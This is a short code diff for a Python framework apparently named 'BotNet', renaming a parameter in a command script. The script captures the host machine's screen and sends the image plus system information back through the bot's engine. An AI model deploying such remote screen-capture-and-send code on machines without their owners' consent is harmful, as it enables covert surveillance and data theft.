@@ -2,11 +2,11 @@ import time
 import os
 from PIL import ImageGrab
 
-from .. import BotNet, Request
+from .. import BotNet, Context
 
 
 @BotNet.default_script(script_version="0.0.1")
-def screenshot(request: Request) -> str:
+def screenshot(context: Context) -> str:
     """get screen shot
     * `[mac-address] /screenshot`
     or
@@ -26,7 +26,7 @@ def screenshot(request: Request) -> str:
             # Save the image to the file object as a PNG
             screenshot.save(file, "PNG")
 
-        res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
+        res = context.engine.send_file(file_name, additionalـinfo=context.system_info(minimal=True))
         if res:
             return None
         return "send screen-shot failed!, engine.send_file error"
